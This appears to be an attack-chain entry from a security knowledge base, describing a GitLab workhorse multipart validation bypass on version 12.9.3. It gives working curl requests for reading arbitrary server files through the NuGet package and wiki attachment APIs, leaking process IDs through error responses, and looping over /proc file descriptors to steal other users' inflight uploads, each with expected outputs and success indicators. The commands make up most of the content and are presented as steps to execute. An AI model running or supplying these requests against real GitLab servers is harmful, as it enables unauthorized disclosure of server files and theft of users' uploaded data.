---
tags:
  - gitlab
  - bypass
  - file-read
  - info-leak
  - proc-exploit
type: attack_chain
tools:
  - '[[tools/sudo]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
  - '[[Collection]]'
commands: []
platforms:
  - Linux
  - GitLab
complexity: medium
procedures:
  - '[[procedures/Bypass-Package-Upload-Validation-for-File-Read]]'
  - '[[procedures/Exploit-Wiki-Attachments-for-Arbitrary-File-Access]]'
  - '[[procedures/Discover-Valid-PIDs-via-Information-Leak]]'
  - '[[procedures/Steal-Inflight-Files-Using-/proc/fd-in-Loop]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
  - '[[File and Directory Discovery]]'
description: >-
  Multi-stage exploit chain bypassing GitLab's workhorse validation to read
  arbitrary files in allowed paths and steal inflight uploads via /proc symlinks
skill_level: advanced
impact_level: high
id: 53aa7767-b3ad-4a21-9dfc-d2e6a79e0611
created_at: '2025-12-11T03:47:39.432Z'
updated_at: '2025-12-11T03:47:39.432Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0007]]'
  - '[[TA0009]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1005]]'
  - '[[T1083]]'
---
# GitLab Workhorse Multipart Bypass for Arbitrary File Read and Inflight Upload Theft

## Overview

This attack chain exploits a validation bypass in GitLab's gitlab-workhorse component, allowing attackers to read files in allowed paths by crafting multipart form fields. It progresses from basic file reads in temporary directories to stealing inflight uploads via /proc symlinks, potentially disclosing sensitive information.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Advanced |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Setup] --> B[Package Bypass] --> C[Wiki Exploit] --> D[PID Discovery] --> E[File Theft]
    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools
- #curl
- #echo
- [[tools/sudo]]

### Target Environment
- GitLab 12.9.3-ee on Linux (Ubuntu 18.04)
- Services: PostgreSQL, Redis, GitLab Shell, unicorn
- Tech Stack: Ruby 2.6.5, Rails, Git 2.24.1

### Initial Access Requirements
- Valid API token for GitLab project access
- Network access to GitLab API endpoints
- Ability to execute commands on the target server for setup (simulated attacker control)

## Detailed Attack Procedures

### Step 1: Setup Test Files and Bypass Package Upload - [[procedures/Bypass-Package-Upload-Validation-for-File-Read]]

**Objective**: Create test files on the server and exploit the package upload endpoint to read arbitrary files in allowed paths.

**Instructions**:
Use [[commands/echo-create-test-file]] to create a test file:

```bash
echo hello > /tmp/ggg
```

Then change ownership with [[commands/sudo-chown-git]]:

```bash
sudo chown git:git /tmp/ggg
```

Send the crafted request using [[commands/curl-put-package-bypass]]:

```bash
curl -XPUT -v -F '[package]=@/tmp/lala.txt' "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"
```

**Expected Output**: JSON response indicating successful creation, with the file content disclosed.

**Success Indicators**:
- HTTP 201 Created
- Target file content appears in response

### Step 2: Exploit Wiki Attachments Without Ownership Restrictions - [[procedures/Exploit-Wiki-Attachments-for-Arbitrary-File-Access]]

**Objective**: Read files owned by any user by exploiting the wiki attachments API.

**Instructions**:
Create a test file with [[commands/echo-create-test-file]]:

```bash
echo hello > /tmp/ggg
```

Change ownership to root with [[commands/sudo-chown-root]]:

```bash
sudo chown root:root /tmp/ggg
```

Send the POST request using [[commands/curl-post-wiki-attachment]]:

```bash
curl -g -XPOST -v -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'
```

**Expected Output**: JSON with file details, including content of /tmp/ggg.

**Success Indicators**:
- HTTP 201 Created
- File metadata and content leaked

### Step 3: Discover Valid PIDs for Targeting - [[procedures/Discover-Valid-PIDs-via-Information-Leak]]

**Objective**: Identify process IDs to target for inflight file theft using API error leaks.

**Instructions**:
Check HTTP codes for PIDs with [[commands/curl-check-pid-http-code]] (example for PID 19603):

```bash
curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
```

Leak PID via group import with [[commands/curl-leak-pid-group-import]]:

```bash
curl -H "Authorization: Bearer $TOKEN_R" -F 'lala=@/tmp/lala.txt' 'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/self'
```

**Expected Output**: Error messages revealing PIDs and paths.

**Success Indicators**:
- HTTP codes like 201 or 500 indicating valid paths
- Leaked PID in error message

### Step 4: Steal Inflight Files in Loop - [[procedures/Steal-Inflight-Files-Using-/proc/fd-in-Loop]]

**Objective**: Continuously attempt to read open file descriptors to steal temporary uploads.

**Instructions**:
Run the loop with [[commands/curl-loop-steal-fd]]:

```bash
while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt' | grep file_name; done
```

**Expected Output**: JSON snippets with stolen file names and details.

**Success Indicators**:
- Repeated outputs showing file names from inflight uploads
- Successful exfiltration of sensitive files

## Attack Chain Summary

### Key Achievements
1. Bypassed multipart validation to read files in allowed directories
2. Accessed files without ownership restrictions via wiki API
3. Leaked process information to target specific PIDs
4. Stole temporary upload files leading to data disclosure

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques
- [[Exploit Public-Facing Application]]
- [[Data from Local System]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics
- [[Initial Access]]
- [[Discovery]]
- [[Collection]]

*Last updated: 2023-10-01*
